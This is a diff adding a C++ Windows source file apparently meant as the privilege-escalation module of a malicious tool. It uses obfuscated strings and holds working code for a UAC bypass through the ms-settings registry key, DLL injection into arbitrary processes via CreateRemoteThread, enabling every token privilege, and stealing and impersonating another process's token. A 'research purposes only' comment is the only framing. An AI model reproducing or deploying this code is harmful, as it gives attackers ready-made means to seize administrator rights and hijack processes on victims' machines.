@@ -1,0 +1,243 @@
+#include "security/PrivilegeEscalation.h"
+#include "core/Logger.h"
+#include "utils/SystemUtils.h"
+#include <Windows.h>
+#include <sddl.h>
+#include <accctrl.h>
+#include <aclapi.h>
+
+// Obfuscated strings
+constexpr auto OBF_PRIVILEGE_ESCALATION = OBFUSCATE("PrivilegeEscalation");
+constexpr auto OBF_PRIVILEGE_ENABLED = OBFUSCATE("Privilege enabled: %s");
+constexpr auto OBF_PRIVILEGE_FAILED = OBFUSCATE("Failed to enable privilege: %s, error: %d");
+
+bool PrivilegeEscalation::EnablePrivilege(LPCTSTR privilege) {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        LOG_ERROR("OpenProcessToken failed: " + std::to_string(GetLastError()));
+        return false;
+    }
+
+    if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
+        LOG_ERROR("LookupPrivilegeValue failed: " + std::to_string(GetLastError()));
+        CloseHandle(hToken);
+        return false;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
+        LOG_ERROR("AdjustTokenPrivileges failed: " + std::to_string(GetLastError()));
+        CloseHandle(hToken);
+        return false;
+    }
+
+    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+        LOG_WARN("The token does not have the specified privilege");
+        CloseHandle(hToken);
+        return false;
+    }
+
+    CloseHandle(hToken);
+    return true;
+}
+
+bool PrivilegeEscalation::IsAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID adminGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+
+    if (!AllocateAndInitializeSid(&ntAuthority, 2,
+        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+        0, 0, 0, 0, 0, 0, &adminGroup)) {
+        return false;
+    }
+
+    if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
+        isAdmin = FALSE;
+    }
+
+    FreeSid(adminGroup);
+    return isAdmin;
+}
+
+bool PrivilegeEscalation::TryUACBypass() {
+    // Attempt various UAC bypass techniques (for research purposes only)
+    std::vector<bool(*)(void)> techniques = {
+        // Technique 1: DLL hijacking
+        []() -> bool {
+            // This would attempt to place a malicious DLL in a writable directory
+            // that gets loaded by a privileged process
+            return false; // Placeholder
+        },
+        // Technique 2: Registry modification
+        []() -> bool {
+            HKEY hKey;
+            if (RegCreateKeyExA(HKEY_CURRENT_USER,
+                "Software\\Classes\\ms-settings\\shell\\open\\command",
+                0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+                
+                std::wstring exePath = utils::FileUtils::GetCurrentExecutablePath();
+                if (RegSetValueExA(hKey, NULL, 0, REG_SZ,
+                    (const BYTE*)exePath.c_str(), (DWORD)exePath.length() * 2 + 1) == ERROR_SUCCESS) {
+                    
+                    RegCloseKey(hKey);
+                    return true;
+                }
+                RegCloseKey(hKey);
+            }
+            return false;
+        }
+    };
+
+    for (const auto& technique : techniques) {
+        if (technique()) {
+            LOG_WARN("UAC bypass technique succeeded");
+            return true;
+        }
+    }
+
+    return false;
+}
+
+bool PrivilegeEscalation::CreateElevatedProcess() {
+    SHELLEXECUTEINFO sei = { sizeof(sei) };
+    std::wstring exePath = utils::FileUtils::GetCurrentExecutablePath();
+
+    sei.lpVerb = L"runas";
+    sei.lpFile = exePath.c_str();
+    sei.hwnd = NULL;
+    sei.nShow = SW_NORMAL;
+
+    if (!ShellExecuteEx(&sei)) {
+        LOG_ERROR("ShellExecuteEx failed: " + std::to_string(GetLastError()));
+        return false;
+    }
+
+    return true;
+}
+
+bool PrivilegeEscalation::InjectIntoProcess(DWORD pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) {
+        LOG_ERROR("OpenProcess failed: " + std::to_string(GetLastError()));
+        return false;
+    }
+
+    // Get the address of LoadLibraryA
+    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    if (!pLoadLibrary) {
+        LOG_ERROR("GetProcAddress failed: " + std::to_string(GetLastError()));
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    // Allocate memory in the target process
+    std::string dllPath = utils::StringUtils::WideToUtf8(utils::FileUtils::GetCurrentModulePath());
+    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, dllPath.length(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemoteMem) {
+        LOG_ERROR("VirtualAllocEx failed: " + std::to_string(GetLastError()));
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    // Write the DLL path to the target process
+    if (!WriteProcessMemory(hProcess, pRemoteMem, dllPath.c_str(), dllPath.length(), NULL)) {
+        LOG_ERROR("WriteProcessMemory failed: " + std::to_string(GetLastError()));
+        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    // Create remote thread to load the DLL
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMem, 0, NULL);
+    if (!hThread) {
+        LOG_ERROR("CreateRemoteThread failed: " + std::to_string(GetLastError()));
+        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    return true;
+}
+
+bool PrivilegeEscalation::ModifyTokenPrivileges() {
+    HANDLE hToken;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
+        LOG_ERROR("OpenProcessToken failed: " + std::to_string(GetLastError()));
+        return false;
+    }
+
+    // Enable all available privileges
+    DWORD dwSize;
+    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
+    
+    PTOKEN_PRIVILEGES pPrivileges = (PTOKEN_PRIVILEGES)malloc(dwSize);
+    if (!pPrivileges) {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    if (GetTokenInformation(hToken, TokenPrivileges, pPrivileges, dwSize, &dwSize)) {
+        for (DWORD i = 0; i < pPrivileges->PrivilegeCount; i++) {
+            pPrivileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
+        }
+
+        if (AdjustTokenPrivileges(hToken, FALSE, pPrivileges, dwSize, NULL, NULL)) {
+            free(pPrivileges);
+            CloseHandle(hToken);
+            return true;
+        }
+    }
+
+    free(pPrivileges);
+    CloseHandle(hToken);
+    return false;
+}
+
+bool PrivilegeEscalation::StealToken(DWORD pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
+    if (!hProcess) {
+        LOG_ERROR("OpenProcess failed: " + std::to_string(GetLastError()));
+        return false;
+    }
+
+    HANDLE hToken;
+    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
+        LOG_ERROR("OpenProcessToken failed: " + std::to_string(GetLastError()));
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    HANDLE hDupToken;
+    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
+        LOG_ERROR("DuplicateTokenEx failed: " + std::to_string(GetLastError()));
+        CloseHandle(hToken);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    if (!ImpersonateLoggedOnUser(hDupToken)) {
+        LOG_ERROR("ImpersonateLoggedOnUser failed: " + std::to_string(GetLastError()));
+        CloseHandle(hDupToken);
+        CloseHandle(hToken);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    CloseHandle(hDupToken);
+    CloseHandle(hToken);
+    CloseHandle(hProcess);
+    return true;
+}
